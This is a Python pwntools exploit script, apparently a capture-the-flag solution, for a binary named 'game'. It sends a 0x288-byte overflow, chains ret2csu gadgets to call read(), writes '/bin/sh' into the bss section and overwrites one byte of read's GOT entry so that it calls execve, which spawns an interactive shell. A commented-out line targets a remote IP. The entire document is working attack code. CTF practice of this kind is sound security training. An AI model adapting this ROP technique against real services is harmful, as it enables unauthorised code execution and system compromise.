from pwn import *

context.log_level = 'debug'
#p=remote('121.36.21.113','10004')
p = process(['./game','333113263'])
elf = ELF('./game')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
read_got=elf.got['read']
read_plt=elf.plt['read']
bss=elf.bss()+0x100
pop_rdi=0x00000000004008d3	# : pop rdi ; ret
pop_rsi_r15=0x00000000004008d1 #pop rsi ; pop r15 ; ret
print(hex(read_got))
csu_front=0x4008B0
csu_behind=0x4008c6
def csu(rbx,rbp,r12,r13,r14,r15):
	payload=p64(csu_behind)
	payload+=p64(0) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
	payload+=p64(csu_front)
	payload+='\x00'*0x38
	return payload
#r13=rdx   r14=rsi  r15=rdi

#main=0x4007E5

#p.recvuntil('Hi, input code:')

#p.sendline('333113263')

payload='a'*0x288
payload+=csu(0, 1, read_got, 8, bss, 0)
payload+=csu(0, 1, read_got, 59, read_got, 0)
payload+=p64(pop_rdi)+p64(1)+p64(read_plt)
#payload+=csu(0, 1, read_plt, 1, read_got, 1)

payload+=p64(csu_behind)
payload+=p64(0) + p64(0) + p64(1) + p64(read_got) + p64(0) + p64(0) + p64(bss)
payload+=p64(csu_front)
print(hex(len(payload)))
p.send(payload)

sleep(1)
#gdb.attach(p)
#pause()
p.send('/bin/sh\x00')
sleep(1)

payload='\x40'
p.send(payload)
#  1e 5e 7b ae 7f 40 ae
p.interactive()
